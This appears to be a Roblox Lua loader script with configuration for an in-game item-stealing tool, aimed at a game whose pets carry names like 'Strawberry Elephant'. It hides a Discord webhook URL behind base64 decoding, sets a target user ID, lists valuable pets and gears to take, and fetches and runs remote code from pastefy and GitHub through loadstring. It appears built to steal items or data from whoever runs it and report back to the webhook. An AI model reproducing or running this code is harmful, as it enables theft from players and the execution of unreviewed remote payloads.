local genv = getgenv()

genv.GOOD_WEBHOOK = (function()
    local d="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTM5MTA3MDMwNjE3Mjk0OC9teGZCQkdnMnVzR19DM28wQ29DX1lza0NwSWNxWUpKSUJYU0kzelV1UXRyRmtjVHVBNzRTWlpKR1Q3Y3Q0cnV5dVl6Mg=="
    local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o,b={},{}
    for i=1,#B do b[B:sub(i,i)]=i-1 end
    local n,bits=0,0
    for i=1,#d do
        local c=d:sub(i,i)
        if c~='=' then
            local v=b[c]
            if v then
                n=n*64+v; bits=bits+6
                if bits>=8 then bits=bits-8; o[#o+1]=string.char(math.floor(n/2^bits)%256); n=n%2^bits end
            end
        end
    end
    return table.concat(o)
end)()

genv.TARGET_USER_ID = 2829121161

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Bumbatron",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro And Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Fishino Clownino",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "S'more Serat",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "Los Chillis",
    "Los Hackers",
    "Bearito Cabinito",
    "Rubiko and Kubiko",
    "Capitano Americano",
    "Examen Bros",
    "Los Spaghettis",
    "Rubrikiko",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Queen Bee",
    "Cloverat Clapat",
    "Caylusaurus",
    "Hopilikalika Hopilikalako",
    "Garama and Madundung",
    "Globa Steppa",
    "Fragola La La La",
    "Los Tacoritas",
    "Dug Dug Dug",
    "Rico Dinero",
    "Tirilikalika Tirilikalako",
    "Jolly Jolly Sahur",
    "Money Money Bros",
    "Yetimatic",
    "La Breakfast Combinasion",
    "La Fuse Machine",
    "Sammyni Truckini"
}

genv.ALLOWED_BASESKINS = {

}

genv.ALLOWED_GEARS = {
    ["Bloodmoon Slap"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Rainbow Hammer"] = true,
    ["Candy Sentry"] = true
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    "https://pastefy.app/I9mewuyb/raw"
}

-- Optional GUI / other loaders
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/BEUKKcZd/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
